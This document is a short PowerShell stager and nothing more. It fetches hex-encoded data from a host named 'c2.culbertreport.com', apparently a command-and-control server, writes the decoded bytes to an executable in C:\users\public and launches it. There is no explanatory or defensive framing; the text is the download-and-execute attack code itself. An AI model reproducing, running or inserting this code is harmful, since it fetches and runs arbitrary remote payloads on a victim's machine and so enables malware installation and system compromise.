invoke-restmethod 'http://c2.culbertreport.com:8000' | Tee-Object -Variable hex
[System.IO.File]::WriteAllBytes('C:\users\public\tmp.exe', ($hex -split '(.{2})' -ne '' -replace '^', '0X')) 
Start-Process -FilePath “C:\users\public\tmp.exe”
